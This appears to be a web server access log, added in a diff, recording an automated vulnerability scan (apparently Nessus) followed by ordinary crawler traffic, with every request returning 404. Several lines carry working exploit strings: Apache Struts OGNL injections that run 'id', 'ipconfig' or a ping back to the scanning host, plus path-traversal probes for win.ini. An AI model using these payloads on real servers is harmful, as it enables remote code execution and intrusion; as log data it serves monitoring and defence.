+INFO:     198.82.145.75:36402 - "GET /wwwadmin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36410 - "GET /wwwboard.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36426 - "GET /xampp/cgi.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36442 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36446 - "GET /_mt/mt.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36458 - "GET /admin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36468 - "GET /administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36480 - "GET /buglist.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36486 - "GET /cgi/mid.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36500 - "GET /cgi-bin/admin HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36502 - "GET /cgi-bin/admin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36508 - "GET /cgi-bin/admin.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36524 - "GET /cgi-bin/administrator HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36540 - "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36556 - "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36566 - "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36582 - "GET /cgi-bin/cart.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36590 - "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36598 - "GET /cgi-bin/count.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36600 - "GET /cgi-bin/Count.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36616 - "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36618 - "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36630 - "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36634 - "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36646 - "GET /cgi-bin/help.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36658 - "GET /cgi-bin/hi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36660 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36674 - "GET /cgi-bin/index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36686 - "GET /cgi-bin/index.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36694 - "GET /cgi-bin/login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36698 - "GET /cgi-bin/mailit.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36710 - "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36726 - "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36730 - "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36732 - "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36746 - "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36756 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36758 - "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36774 - "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36790 - "GET /cgi-bin/search HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36798 - "GET /cgi-bin/search.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36808 - "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36818 - "GET /cgi-bin/status HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36830 - "GET /cgi-bin/status.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36840 - "GET /cgi-bin/test.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36848 - "GET /cgi-bin/test.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36862 - "GET /cgi-bin/test-cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36878 - "GET /cgi-bin/upload.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36880 - "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36884 - "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36890 - "GET /cgi-bin/wa HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36906 - "GET /cgi-bin/wa.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36910 - "GET /cgi-bin/wa.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36916 - "GET /cgi-bin/whois.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36926 - "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36936 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36944 - "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36958 - "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36968 - "GET /index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36978 - "GET /index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36984 - "GET /index.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36998 - "GET /nph-mr.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37012 - "GET /query.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37024 - "GET /session_login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37032 - "GET /show_bug.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37048 - "GET /test HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37056 - "GET /test.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37064 - "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37078 - "GET /whois.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37080 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37090 - "GET /wwwadmin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37104 - "GET /wwwboard.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37108 - "GET /xampp/cgi.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37114 - "POST /cgi-bin/file_transfer.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37128 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37132 - "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37136 - "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37142 - "GET /SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37156 - "GET /..%5Cpixfir~1%5Chow_to_login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37166 - "GET /global.asa HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37172 - "GET /trace.axd HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37180 - "GET /index.jsp%00x HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:37204 - "GET /rails_info/properties HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37214 - "GET /_mt/mt.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:37226 - "GET /admin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51112 - "GET /administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51118 - "GET /support/messages HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51150 - "GET /?tag=tenable-970488288&method%3a%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23writer%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23writer.println(%23parameters.tag[0]),%23writer.flush(),%23writer.close HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51152 - "GET /?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'id'})).start()} HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51166 - "GET /?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'ipconfig'})).start()} HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51128 - "POST / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51176 - "GET /?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23webroot%3d%23req.getSession().getServletContext().getRealPath('/'),%23resp%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23resp.print('At%201760982867%20Nessus%20found%20the%20path%20is%20'),%23resp.println(%23webroot),%23resp.flush(),%23resp.close()} HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51124 - "GET %24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ping%20-c%203%20-p%20494f6e41516d4b473255%20198.82.145.75%27%29%29%7D// HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51144 - "GET //%28%23mem%3D%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29%3F%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29%3Aindex.xhtml?cmd=ping%20%2dc%203%20%2dp%2070796231787344795267%20198.82.145.75 HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51178 - "GET /?redirect:$%7b%23context%5b%27xwork.MethodAccessor.denyMethodExecution%27%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20-c%203%20-p43495836686769546372%20198.82.145.75%27%29.getInputStream%28%29%29%7d HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:51190 - "GET /buglist.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60340 - "GET /?redirect:%24%7B57550614%2b16044095%7D HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60348 - "GET //%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3D%21%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%2C%28%40java.lang.Runtime%40getRuntime%28%29%29.exec%28%27id%27%29.waitFor%28%29%7D.action HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60364 - "GET //%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3D%21%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%2C%28%40java.lang.Runtime%40getRuntime%28%29%29.exec%28%27ipconfig%27%29.waitFor%28%29%7D.action HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60368 - "POST /flex2gateway/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60370 - "POST /messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60378 - "POST /blazeds/messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60380 - "POST /lcds/messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60394 - "POST /flex2gateway/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60396 - "POST /messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60408 - "POST /blazeds/messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60422 - "POST /lcds/messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60438 - "POST /flex2gateway/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60448 - "POST /messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60454 - "POST /blazeds/messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60468 - "POST /lcds/messagebroker/http HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60478 - "GET /cgi/mid.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60480 - "GET /cgi-bin/admin HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:46872 - "GET %24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ping%20-c%203%20-p%20494f6e41516d4b473255%20198.82.145.75%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D// HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:46880 - "GET /cgi-bin/admin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:46892 - "GET /cgi-bin/admin.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:53730 - "GET /cgi-bin/administrator HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:53742 - "GET %24%7B%7B57550614%2B16044095%7D%7D// HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:53756 - "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39230 - "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:39232 - "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33478 - "GET /cgi-bin/cart.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33488 - "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41360 - "GET /cgi-bin/count.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41366 - "GET /cgi-bin/Count.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54680 - "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:54686 - "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:35466 - "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:47094 - "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:47108 - "GET /cgi-bin/help.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:58892 - "GET /cgi-bin/hi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:58898 - "GET /cgi-bin/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38566 - "GET /cgi-bin/index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38572 - "GET /cgi-bin/index.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:49616 - "GET /cgi-bin/login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:49622 - "GET /cgi-bin/mailit.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34234 - "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34250 - "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32868 - "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:32874 - "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:55768 - "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:55780 - "GET /cgi-bin/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:57976 - "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:57992 - "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:43016 - "GET /cgi-bin/search HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:43030 - "GET /cgi-bin/search.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34738 - "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34746 - "GET /cgi-bin/status HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42520 - "GET /cgi-bin/status.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42534 - "GET /cgi-bin/test.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:52042 - "GET /cgi-bin/test.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:52058 - "GET /cgi-bin/test-cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40028 - "GET /cgi-bin/upload.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:40030 - "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:55834 - "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:55850 - "GET /cgi-bin/wa HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:47162 - "GET /cgi-bin/wa.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:47170 - "GET /cgi-bin/wa.exe HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:46246 - "GET /cgi-bin/whois.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:46258 - "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41156 - "GET /cgi-mod/index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:41168 - "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34696 - "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:34698 - "GET /index.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42390 - "GET /index.pl HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42394 - "GET /index.sh HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36180 - "GET /nph-mr.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:36188 - "GET /query.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33814 - "GET /session_login.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:33820 - "GET /show_bug.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42884 - "GET /test HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:42900 - "GET /test.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60528 - "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60538 - "GET /whois.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:45078 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:45094 - "GET /wwwadmin.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60810 - "GET /wwwboard.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:60812 - "GET /xampp/cgi.cgi HTTP/1.1" 404 Not Found
+INFO:     40.77.167.219:28311 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     157.55.39.204:22387 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     27.115.124.49:24915 - "GET / HTTP/1.1" 404 Not Found
+INFO:     27.115.124.40:62039 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     27.115.124.5:17462 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     27.115.124.49:55747 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     27.115.124.34:8166 - "GET /sse HTTP/1.1" 404 Not Found
+INFO:     27.115.124.48:56100 - "GET /mcp HTTP/1.1" 404 Not Found
+INFO:     27.115.124.48:17903 - "GET /mcp-sse HTTP/1.1" 404 Not Found
+INFO:     27.115.124.49:57478 - "GET /get_server_info HTTP/1.1" 404 Not Found
+INFO:     20.171.207.182:44982 - "GET / HTTP/1.1" 404 Not Found
+INFO:     79.127.221.30:22129 - "GET / HTTP/1.1" 404 Not Found
+INFO:     79.127.221.30:22129 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     79.127.221.30:32879 - "GET / HTTP/1.1" 404 Not Found
+INFO:     79.127.221.30:18533 - "GET / HTTP/1.1" 404 Not Found
+INFO:     20.197.112.232:61056 - "GET / HTTP/1.1" 404 Not Found
+INFO:     52.167.144.54:55042 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     52.167.144.238:44125 - "GET / HTTP/1.1" 404 Not Found
+INFO:     52.167.144.238:44118 - "GET / HTTP/1.1" 404 Not Found
+INFO:     40.77.167.27:9946 - "GET / HTTP/1.1" 404 Not Found
+INFO:     192.238.159.229:39171 - "GET / HTTP/1.1" 404 Not Found
+INFO:     43.134.186.61:58702 - "GET / HTTP/1.1" 404 Not Found
+INFO:     54.204.62.163:30470 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     4.227.36.120:43534 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     4.227.36.120:56046 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     4.227.36.120:42016 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     4.227.36.120:42582 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     23.95.114.248:17077 - "GET / HTTP/1.1" 404 Not Found
